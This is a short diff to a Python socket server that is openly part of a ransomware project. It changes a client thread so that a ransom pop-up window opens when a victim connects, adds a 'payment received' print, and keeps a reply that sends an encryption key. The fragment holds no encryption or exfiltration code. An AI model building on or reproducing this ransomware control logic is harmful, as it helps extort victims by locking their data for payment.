@@ -6,7 +6,7 @@ import sys
 from threading import Thread
 
 sys.path.insert(0, 'crypto/')   
-from interface import pop_up_win
+import interface
 
 class ClientThread(Thread):
 
@@ -18,12 +18,13 @@ class ClientThread(Thread):
 
     def run(self):
         while True:
-
+            #open the ransomware window when the client connects
+            interface.pop_up_win()
+            print("ransomware payment received:", interface.payment)
+            
             data = self.conn.recv(2048)
             if not data: break
             
-            #open the ransomware window when the client connects
-            pop_up_win()
             print(f"recieved data: {data}")
 
             self.conn.send(b"Here is encryption key: XXXXXX")
